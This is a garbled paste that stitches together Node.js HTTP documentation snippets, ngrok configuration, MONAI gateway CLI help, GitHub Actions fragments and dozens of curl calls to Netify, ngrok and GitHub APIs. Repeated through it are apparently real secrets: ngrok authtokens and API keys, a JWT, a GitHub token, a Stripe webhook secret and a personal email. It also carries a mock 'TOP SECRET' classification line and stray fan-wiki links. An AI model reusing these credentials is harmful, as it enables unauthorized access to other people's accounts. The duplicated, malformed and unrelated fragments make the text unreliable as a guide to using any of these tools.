CERTIFICATE-----\nMIIEBDCCAuygAwIBAgIRAOT8A8TGFjL7kvO/m0bVKR8wDQYJKoZIhvcNAQELBQAw\ngaAxTjBMBgNVBAoMRWh0dHBzOi8vaWRwLmxvY2FsLW5ncm9rLmNvbS9zYW1sL2Vk\nZ2h0c3J0XzJiTW1YRmthUFRMRTl4eVhUVFR4aWdCUlJFTjFOMEwGA1UEAwxFaHR0\ncHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3NhbWwvZWRnaHRzcnRfMmJNbVhGa2FQ\nVExFOXh5WFRUVHhpZ0JSUkVOMCAXDTI0MDEyMzE4MDkxOVoYDzIwNTkwMTE0MTgw\nOTE5WjCBoDFOMEwGA1UECgxFaHR0cHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3Nh\nbWwvZWRnaHRzcnRfMmJNbVhGa2FQVExFOXh5WFRUVHhpZ0JSUkVOMU4wTAYDVQQD\nDEVodHRwczovL2lkcC5sb2NhbC1uZ3Jvay5jb20vc2FtbC9lZGdodHNydF8yYk1t\nWEZrYVBUTEU5eHlYVFRUeGlnQlJSRU4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQCvvcWPTZy3bIjnFSZfEPwGwZcOzkNnIQrNlX5v7SsucJHCxtCNKt9B\nzi6HTcRteOGEydVOr3Lg8MX8DdEecOt4e0Hf0NeChbX1gYsS1b2+0Q9sf9sH7fu1\n1F5y7zOlVRvWjuars3HVYqGQkTBATAcqkvUuUJeHzyWleQ8CXL3Ixp2TcJa/7fsz\njW2Heg4CX6Lx3E3Z6cGh2hFi1VFuKdeAufgZGbAbIBUpAnMAwMdJI/MLp3D4fHQv\n0VCwdXKhWt+SvidWVBg2Tv97phncbNMPNVi6VERO8+n7A5qdHG9efGnOTrLnxzJu\n97AfRBU8I88kdy4trPy9xeFBwnvlnlhZAgMBAAGjNTAzMA4GA1UdDwEB/wQEAwIH\ngDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB\nCwUAA4IBAQAWA4t3JKL1cjV+CO+doaad/QhlbfW+tbI2n3tuRlrvZWtJKATuKFBZ\nFOqp20EfaeOgtMyDRDU8UNLoMWVT8zNUmzh4MtkrBQkUplPCuBHf844gJtDJdcA8\nxFj/vJyuET18b7fn4ppPG6RAqwH5nbAQ18zbKr8MgEWK0YbX4Wb+3fZVRfbKMFPp\nGs9CoZyC/Tz0z50xI3Am4d8QxibQQOinAuPQk6HcyP5Eg+bdUrBYTEdWircNZ1Hs\nDVIblwsbQ7TvDp+qtzyVjbtwa8yLBSlPRXkoYaXKhU9ziIYT1GIqrhV2KNO8qXn7\nGNTnpMopy0wcdJ05v4S12jFaKFknbvTv\n-----END CERTIFICATE-----\n", "metadata_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "nameid_format": "urn:oasis:names:tc:SAML:2.0:nameid-format:persistent" }

          #000006 $ Breadcrumbs X 4
### ++ Sigma 9 ++
          #000006 $ Breadcrumbs X 4
HANDLE CreateFileA( [in] LPCSTR lpFileName, [in] DWORD dwDesiredAccess, [in] DWORD dwShareMode, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, [in] DWORD dwCreationDisposition, [in] DWORD dwFlagsAndAttributes, [in, optional] HANDLE hTemplateFile ); typedef struct _SECURITY_DESCRIPTOR { BYTE Revision; BYTE Sbz1; SECURITY_DESCRIPTOR_CONTROL Control; PSID Owner; PSID Group; PACL Sacl; PACL Dacl; } SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;

{ "content-length": "123", "content-type": "text/plain", "connection": "keep-alive", "host": "example.com", "accept": "/" } [ 'ConTent-Length', '123456', 'content-LENGTH', '123', 'content-type', 'text/plain', 'CONNECTION', 'keep-alive', 'Host', 'example.com', 'accepT', '/' ] http.get(options, (res) => { // Do stuff }).on('socket', (socket) => { socket.emit('agentRemove'); });

http.get({ hostname: 'localhost', port: 80, path: '/', agent: false, // Create a new agent just for this one request }, (res) => { // Do stuff with response }); Configures API endpoint $ mig config --endpoint HTTP://localhost:5000 import { Agent, request } from 'node:http'; const keepAliveAgent = new Agent({ keepAlive: true }); options.agent = keepAliveAgent; request(options, onResponseCallback); socket.setKeepAlive(true, this.keepAliveMsecs); socket.unref(); return true; socket.ref(); import { createServer, request } from 'node:http'; import { connect } from 'node:net'; import { URL } from 'node:url';

// Create an HTTP tunneling proxy const proxy = createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('okay'); }); proxy.on('connect', (req, clientSocket, head) => { // Connect to an origin server const { port, hostname } = new URL(http://${req.url}); const serverSocket = connect(port || 80, hostname, () => { clientSocket.write('HTTP/1.1 200 Connection Established\r\n' + 'Proxy-agent: Node.js-Proxy\r\n' + '\r\n'); serverSocket.write(head); serverSocket.pipe(clientSocket); clientSocket.pipe(serverSocket); }); });

// Now that proxy is running proxy.listen(1337, '127.0.0.1', () => {

// Make a request to a tunneling proxy const options = { port: 1337, host: '127.0.0.1', method: 'CONNECT', path: 'www.google.com:80', };

const req = request(options); req.end();

req.on('connect', (res, socket, head) => { console.log('got connected!');

// Make a request over an HTTP tunnel
socket.write('GET / HTTP/1.1\r\n' +
             'Host: www.google.com:80\r\n' +
             'Connection: close\r\n' +
             '\r\n');
socket.on('data', (chunk) => {
  console.log(chunk.toString());
});
socket.on('end', () => {
  proxy.close();
});
}); });

import { request } from 'node:http';

const options = { host: '127.0.0.1', port: 8080, path: '/length_request', };

// Make a request const req = request(options); req.end();

req.on('information', (info) => { console.log(Got information prior to main response: ${info.statusCode}); });

import http from 'node:http'; import process from 'node:process';

// Create an HTTP server const server = http.createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('okay'); }); server.on('upgrade', (req, socket, head) => { socket.write('HTTP/1.1 101 Web Socket Protocol Handshake\r\n' + 'Upgrade: WebSocket\r\n' + 'Connection: Upgrade\r\n' + '\r\n');

socket.pipe(socket); // echo back });

// Now that server is running server.listen(1337, '127.0.0.1', () => {

// make a request const options = { port: 1337, host: '127.0.0.1', headers: { 'Connection': 'Upgrade', 'Upgrade': 'websocket', }, };

const req = http.request(options); req.end();

req.on('upgrade', (res, socket, upgradeHead) => { console.log('got upgraded!'); socket.end(); process.exit(0); }); }); request.setHeader('content-type', 'text/html'); request.setHeader('Content-Length', Buffer.byteLength(body)); request.setHeader('Cookie', ['type=ninja', 'language=javascript']); const contentType = request.getHeader('Content-Type'); // 'contentType' is 'text/html' const contentLength = request.getHeader('Content-Length'); // 'contentLength' is of type number const cookie = request.getHeader('Cookie'); // 'cookie' is of type string[]

request.setHeader('Foo', 'bar'); request.setHeader('Cookie', ['foo=bar', 'bar=baz']);

const headers = request.getHeaders(); // headers === { foo: 'bar', 'cookie': ['foo=bar', 'bar=baz'] }

request.setHeader('Foo', 'bar'); request.setHeader('Set-Cookie', ['foo=bar', 'bar=baz']);

const headerNames = request.getRawHeaderNames(); // headerNames === ['Foo', 'Set-Cookie'] const hasContentType = request.hasHeader('content-type'); import http from 'node:http';

// Server has a 5 seconds keep-alive timeout by default http .createServer((req, res) => { res.write('hello\n'); res.end(); }) .listen(3000);

setInterval(() => { // Adapting a keep-alive agent http.get('http://localhost:3000', { agent }, (res) => { res.on('data', (data) => { // Do nothing }); }); }, 5000); // Sending request on 5s interval so it's easy to hit idle timeout import http from 'node:http'; const agent = new http.Agent({ keepAlive: true });

function retriableRequest() { const req = http .get('http://localhost:3000', { agent }, (res) => { // ... }) .on('error', (err) => { // Check if retry is needed if (req.reusedSocket && err.code === 'ECONNRESET') { retriableRequest(); } }); }

retriableRequest(); request.setHeader('Content-Type', 'application/json'); request.setHeader('Cookie', ['type=ninja', 'language=javascript']); request.setHeader('Cookie', ['type=ninja', 'language=javascript']); const filename = 'Rock 🎵.txt'; request.setHeader('Content-Disposition', attachment; filename*=utf-8''${encodeURIComponent(filename)}); import http from 'node:http'; const options = { host: 'www.google.com', }; const req = http.get(options); req.end(); req.once('response', (res) => { const ip = req.socket.localAddress; const port = req.socket.localPort; console.log(Your IP address is ${ip} and your source port is ${port}.); // Consume response object }); server.on('clientError', (err, socket) => { if (err.code === 'ECONNRESET' || !socket.writable) { return; }

socket.end('HTTP/1.1 400 Bad Request\r\n\r\n'); });

Start the MONAI Informatics Gateway with custom configuration

$ mig start

Restart the MONAI Informatics Gateway

$ mig restart [-y | --yes]

Stop the MONAI Informatics Gateway

$ mig stop [-y | --yes]

Add (SCP) AE Title (with optional application mapping)

$ mig aet add [-n NAME] -a AE_TITLE [--apps liver,brain,ABC123]

Delete (SCP) AE Title

$ mig aet rm -n NAME

List all (SCP) AE Title

$ mig aet ls

Add DICOM Source for SCP

$ mig source add [-n NAME] -a AE_TITLE -i HOSTNAME_IP

Delete DICOM Source of SCP

$ mig source rm -n NAME

List all DICOM Sources of SCP

$ mig source ls

Add DICOM Destination for Clara SCU

$ mig dest add [-n NAME] -a AE_TITLE -i HOSTNAME_IP -N NAME -p PORT

Delete DICOM Destination of SCU

$ mig dest rm -n NAME

List all DICOM Destinations of SCU

$ mig dest ls

Get MONAI Informatics Gateway health and status

$ mig status

name: Reusable deploy workflow on: workflow_call: inputs: build_id: required: true type: number deploy_target: required: true type: string perform_deploy: required: true type: boolean

jobs: deploy: runs-on: ubuntu-latest if: {{ inputs.build_id }} --target ${{ inputs.deploy_target }}

first tunnel 'edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL' first tunnel 'edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL' ngrok tunnel --region us --label edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL 22 ngrok tunnel --region us --label edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL 22 header 'bkdtg_2b0vwsM7nbkREHxg8bDHm81vzXe' header 'bkdtg_2b0vwsM7nbkREHxg8bDHm81vzXe' @@ -22801,33 +22826,4 @@ curl --location --request GET 'https://informatics.netify.ai/api/v1/intelligence }' }'

... ... "data_info" "data_info" name: Build and deploy on: push

jobs: build: runs-on: ubuntu-latest outputs: build_id: ${{ steps.build_step.outputs.build_id }} steps: - uses: actions/checkout@v4 - name: Build id: build_step run: | ./build echo "build_id=$BUILD_ID" >> {{ needs.build.outputs.build_id }} debug: needs: [build, deploy] runs-on: ubuntu-latest if: ${{ failure() }} steps: - uses: actions/checkout@v4 - run: ./debug

curl --request POST
--url "https://api.github.com/applications/YOUR_CLIENT_ID/token"
--user "YOUR_CLIENT_ID:YOUR_CLIENT_SECRET"
--header "Accept: application/vnd.github+json"
--header "X-GitHub-Api-Version: 2022-11-28"
--data '{ "access_token": "’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’" }'

Output # Output

dist/ dist/

@@ -8,4 +20,4 @@ node_modules/ ..sw? ..sw? *~ *~ *# *# 228d0c98cf585154e5a2b9dc0676711ed9225944 228d0c98cf585154e5a2b9dc0676711ed9225944 494 changes: 494 additions & 0 deletions 494
.prettierrc.toml

@@ -1,3 +1,497 @@ DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA HANDLE VIA BYEMAN TALENT-KEYHOLE -TOP SECRET CONTROL SYSTEMS JOINTLY

{ "image": "mcr.microsoft.com/devcontainers/universal:2", "features": { } }

https://codespaces.new/6309304695/sigma-3/pull/17?quickstart=1 Sigma-10

      #000006
image

Infomatics Developer Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BvcnRhbC5uZXRpZnkuYWkvbG9naW4iLCJpYXQiOjE3MDUxMzY4MzUsImV4cCI6MTcwNTc0MTYzNSwibmJmIjoxNzA1MTM2ODM1LCJqdGkiOiJ5YUJSNmVaNHowazdmeWVPIiwicm9sZXMiOlsidXNlciJdfQ.D76SvBw4n1cE-uvKaXgEQejvT4lFtYTVI_CI3rfW9jE

$ NGROK cert_2arwYf0cqnJGX9y1yw4Ky2ZQRAe

https://manager.netify.ai/api/v1/assets/sites

curl --location 'https://manager.netify.ai/api/v1/assets/agents' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://manager.netify.ai/api/v1/assets/agents/CH-AM-BE-RS' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location --request POST 'https://manager.netify.ai/api/v1/assets/agents/EX-AM-PL-ES?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location --request DELETE 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{e8197a53-28ed-4f30-82ac-2443940739b8}}&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{dfb33af7_fa5a_4920_a4d4_e7742b273246}}&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA/provision?mode=in-site&label=North%20Wing&organization_uuid={{e8197a53-28ed-4f30-82ac-2443940739b8}}&site_uuid=00000000_0000_0000_0000_000000000000&site_label=Toronto%20Office&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA/provision?mode=in-site&label=North%20Wing&organization_uuid={{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}&site_uuid=00000000_0000_0000_0000_000000000000&site_label=Toronto%20Office&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location --request PATCH 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://manager.netify.ai/api/v1/assets/sites/00000000_0000_0000_0000_000000000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://manager.netify.ai/api/v1/assets/sites' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{e8197a53-28ed-4f30-82ac-2443940739b8}}&plan_id=1000000

curl --location --request PATCH 'https://manager.netify.ai/api/v1/assets/sites/00000000_0000_0000_0000_000000000000?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g 'https://manager.netify.ai/api/v1/assets/organizations/{{e8197a53-28ed-4f30-82ac-e8197a53-28ed-4f30-82ac-2443940739b}}' --header 'ak_2atIkJzKro4NLf7fn2yV6RNd'

curl --location -g 'https://manager.netify.ai/api/v1/assets/organizations/{{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}' --header 'ak_2atIkJzKro4NLf7fn2yV6RNd'

curl --location --request POST 'https://manager.netify.ai/api/v1/assets/organizations?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request PATCH 'https://manager.netify.ai/api/v1/assets/organizations/{{e8197a53-28ed-4f30-82ac-2443940739b8}}?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request PATCH 'https://manager.netify.ai/api/v1/assets/organizations/{{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/aggregate?filter_interval=1440' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator'/ --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/datatable/application' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/scorecard/application/download?filter_interval=1440' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/summary' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/summary' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/top/application/download' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/flows/lookup/6285544?filter_interval=1440' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g 'https://informatics.netify.ai/api/v1/data/flows/stream?filter_start_date=1574705594&filter_end_date=1574791994&filter_fields=[%22fandom.com%22]&filter_required_fields=[%22hfandom.com%22]' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g 'https://informatics.netify.ai/api/v1/event/events?filter_event_categories=[0]&filter_event_basename=agent.online&filter_event_severity=5' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'x-net-organization: 'dfb33af7_fa5a_4920_a4d4_e7742b2732460' --header 'e8197a53-28ed-4f30-82ac-2443940739b8'

curl --location 'https://informatics.netify.ai/api/v1/identity/devices/options' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request POST 'https://informatics.netify.ai/api/v1/identity/device_macs?device_id=2&mac=f8%3A8f%3Aca%3A10%3Ac3%3Aff&label=-' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request PATCH 'https://informatics.netify.ai/api/v1/identity/device_macs/f8:8f:ca:10:c3:dd?label=Intel%20GB' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location 'https://informatics.netify.ai/api/v1/identity/owners/options' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location 'https://informatics.netify.ai/api/v1/identity/owners/options' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246' --header 'e8197a53-28ed-4f30-82ac-2443940739b8'

curl --location 'https://informatics.netify.ai/api/v1/identity/owners' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request POST 'https://informatics.netify.ai/api/v1/identity/owners?first_name=Keith&last_name=Bieszczat' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request PATCH 'https://informatics.netify.ai/api/v1/identity/owners/1004?last_name=Bieszczat%20III' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

OVERSEER-GRATEFUL345I

#000006

Breadcrumbs OVERSEER-GRATEFUL345i

#000006

Breadcrumbs

curl
-X POST -H "Authorization: Bearer {ak_2as1ORVjKAxTVjur5LeHun5z690}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"domain":"myapp.mydomain.com","region":"us","certificate_id":"cert_2arwYf0cqnJGX9y1yw4Ky2ZQRAe"}' https://api.ngrok.com/reserved_domains

apiVersion: v1 kind: Secret metadata: name: github-webhook-secret type: Opaque data: secret-token: ""

kind: NgrokModuleSet apiVersion: ingress.k8s.ngrok.com/v1alpha1 metadata: name: ngrok-module-set modules: webhookVerification: provider: twilio secret: name: "{twilio webhook secret}" key: secret-token

apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: example-ingress annotations: k8s.ngrok.com/modules: ngrok-module-set spec: ingressClassName: ngrok rules: - host: your-domain.ngrok.app http: paths: - path: / pathType: Prefix backend: service: name: example-service port: number: 80 curl -X PUT -H "Authorization: Bearer {ak_2as1ORVjKAxTVjur5LeHun5z690} -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"provider":"TWILIO","secret":"secret_token"}' https://api.ngrok.com/edges/https/edghts_2arwcDuk0T3vQ5nfcBxHwQrWqDj/routes/edghtsrt_2arwcCYIWJyPRtsZRV7Sghgiuf1/webhook_verification

curl -X POST -H "Authorization: Bearer {ak_2as1ORVjKAxTVjur5LeHun5z690}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"acme http response","metadata":"{"environment": "staging"}","body":"I'm a teapot","headers":{"Content-Type":"text/plain"},"status_code":418}' https://api.ngrok.com/backends/http_response

curl -X GET -H "Authorization: Bearer {ak_2as10RVjKAxTVjur5LeHun5z690" -H "Ngrok-Version: 2" https://api.ngrok.com/backends/http_response curl -X PATCH -H "Authorization: Bearer {ak_2as10RVjKAxTVjur5LeHun5z690}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"{"environment": "production"}"}' https://api.ngrok.com/backends/http_response/bkdhr_2arwbYL24DTjjLNbzoWwXKdz7de

ngrok start Grateful 004w ngrok start --all

heroic-enabled-rabbit.ngrok-free.app

$ user id ngrok rd_2asmxxNHyOXQAus3lHS36FxmW1s brew install ngrok/ngrok/ngrok

ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok http 80

$ ngrok http 80

ngrok config edit

version: 2

authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

tunnels:

my_tunnel_name: Grateful 004w

addr: http://localhost:80

ngrok start your_tunnel_name

ngrok start --all

curl -L \

-X POST \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/apps \

-d '{"apps":["octoapp"]}'

curl -L \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/branches/BRANCH/protection/restrictions/users

curl -L \

-X DELETE \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/keys/KEY_ID

curl -L \

-H "Accept: application/vnd.github+json" \

-H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" \

-H "X-GitHub-Api-Version: 2022-11-28" \

https://api.github.com/repos/OWNER/REPO/keys/KEY_ID

https://static.wikia.nocookie.net/memoryalpha/images/c/c5/Sol.jpg/revision/latest?cb=20100201220855&path-prefix=en&mobile-app=true&theme=false

https://github.com/brave/brave-browser.wiki.git

const keyring = new YourKeyringClass(options);

npm install eth-keyring-controller --save

Usage

const KeyringController = require('eth-keyring-controller')

const SimpleKeyring = require('eth-simple-keyring')

const keyringController = new KeyringController({

keyringTypes: [SimpleKeyring], // optional array of types to support.

initState: initState.KeyringController, // Last emitted persisted state.

encryptor: { // An optional object for defining encryption schemes:

brew install ngrok/ngrok/ngrok ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD ngrok http 80

$ ngrok http 80

ngrok config edit version: 2 authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD tunnels: my_tunnel_name: $ grateful 004w addr: http://localhost:80 ngrok start $ grateful 004w ngrok start --all docker run --net=host -it -e NGROK_AUTHTOKEN=2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD ngrok/ngrok:latest http 80 ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80 ngrok config edit

authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD version: 2 tunnels: your_tunnel_name: proto: http hostname: heroic-enabled-rabbit.ngrok-free.app addr: 127.0.0.1:80

-------------------------

Additional options

-------------------------

auth: 'KBieszczat-Password******d"

host_header: rewrite

inspect: true

bind_tls: true

curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD>" -H "X-GitHub-Api-Version: 2022-11-28" \

$ NGROK $Token 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs

authtoken: 4nq9771bPxe8ctg7LKr_2ClH7Y15Zqe4bWLWF9p api_key: 24yRd5U3DestCQapJrrVHLOqiAC_7RviwRqpd3wc9dKLujQZN connect_timeout: 30s console_ui: true console_ui_color: transparent dns_resolver_ips:

1.1.1.1 8.8.8.8 heartbeat_interval: 1m heartbeat_tolerance: 5s inspect_db_size: 104857600 # 100mb inspect_db_size: 50000000 log_level: info log_format: json log: /var/log/ngrok.log metadata: '{"serial": "00012xa-33rUtz9", "comment": "For customer grateful345i@gmail.com"}' proxy_url: socks5://localhost:9150 region: us remote_management: false root_cas: trusted update_channel: stable update_check: false version: 2 web_addr: localhost:4040 tunnels: website: addr: 8888 basic_auth: "bob:bobpassword" schemes: https host_header: "myapp.ngrok.dev" inspect: false proto: http domain: myapp.ngrok.dev e2etls: addr: 9000 proto: tls domain: myapp.ngrok.dev crt: example.crt key: example.key

iprestriction: ip_restriction: allow_cidrs: - 1.1.1.1/32 addr: 8000 proto: tcp

ssh-access: addr: 22 proto: tcp remote_addr: 1.tcp.ngrok.io:12345

my-load-balanced-website: labels: - env=prod - team=infra addr: 8000

OVERSEER-GRATEFUL345I

#000006

brew install ngrok/ngrok/ngrok ngrok config add-authtoken 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs ngrok http 80

$ ngrok http 80

ngrok config edit version: 2 authtoken: 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs tunnels: my_tunnel_name: addr: http://localhost:80 ngrok start your_tunnel_name ngrok start --all docker run --net=host -it -e NGROK_AUTHTOKEN=2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs ngrok/ngrok:latest http 80 ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80 ngrok config edit

authtoken: 2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs version: 2 tunnels: your_tunnel_name: proto: http hostname: heroic-enabled-rabbit.ngrok-free.app addr: 127.0.0.1:80

-------------------------

Additional options

-------------------------

auth: "username:password"

host_header: rewrite

inspect: true

bind_tls: true

curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs>" -H "X-GitHub-Api-Version: 2022-11-28" \

docker run -it -e NGROK_AUTHTOKEN=2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD ngrok/ngrok http 80 --domain=heroic-enabled-rabbit.ngrok-free.app

sudo unzip ~/Downloads/ngrok-v3-stable-darwin.zip -d /usr/local/bin

ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80

ngrok config edit

authtoken: 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD version: 2 tunnels: your_tunnel_name: Grateful 004w proto: http hostname: heroic-enabled-rabbit.ngrok-free.app addr: 127.0.0.1:80

-------------------------

Additional options

-------------------------

auth: "6309304695:password"

host_header: rewrite

inspect: true

bind_tls: true

ngrok http --domain=heroic-enabled-rabbit.ngrok-free.app 80

ngrok http 80 --verify-webhook twilio --verify-webhook-secret "{twilio webhook secret}"

webhook signing secret whsec_E3QgncsPD0agPy78vid0SLQqOKwYeVYV stripe

$ brew install ngrok/ngrok/ngrok

$ sudo unzip ~/Downloads/ngrok-v3-stable-darwin-arm64.zip -d /usr/local/bin

$ ngrok config add-authtoken <2asn8z2E56bn6uASp6tZYSRO5qB_3bUteAN928yk1SCTtatWs> $ ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

in ngrok.yml

